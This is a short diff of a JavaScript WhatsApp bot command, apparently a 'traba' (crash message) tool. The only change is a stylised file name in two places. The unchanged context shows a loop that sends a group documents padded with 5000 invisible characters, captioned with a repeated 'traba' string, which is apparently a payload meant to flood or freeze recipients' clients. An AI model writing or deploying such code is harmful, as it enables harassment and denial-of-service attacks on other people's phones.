@@ -29,7 +29,7 @@ let handler = async (m, { conn }) => {
     const contenido = '\u200E'.repeat(5000) + i;
     await conn.sendMessage(groupId, {
       document: Buffer.from(contenido),
-      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
+      fileName: `🔥𝕮𝖍𝖎𝖓𝖆🔥_${i + 1}`.repeat(2),
       mimetype: 'application/msword',
       caption: traba.repeat(3)
     });
@@ -53,7 +53,7 @@ let handler = async (m, { conn }) => {
     const contenido = '\u200E'.repeat(5000) + i;
     await conn.sendMessage(groupId, {
       document: Buffer.from(contenido),
-      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
+      fileName: `🔥𝕮𝖍𝖎𝖓𝖆🔥_${i + 1}`.repeat(2),
       mimetype: 'application/msword',
       caption: traba.repeat(3)
     });
